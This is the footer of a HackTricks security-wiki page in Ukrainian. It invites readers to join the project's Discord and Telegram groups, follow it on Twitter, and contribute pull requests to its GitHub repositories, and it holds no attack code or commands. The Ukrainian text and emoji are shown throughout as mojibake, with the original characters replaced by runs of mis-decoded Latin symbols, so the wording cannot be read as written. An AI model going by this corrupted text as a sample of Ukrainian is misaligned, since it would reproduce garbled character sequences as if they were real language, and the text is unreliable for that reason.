* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ –≥—Ä—É–ø–∏ [**telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
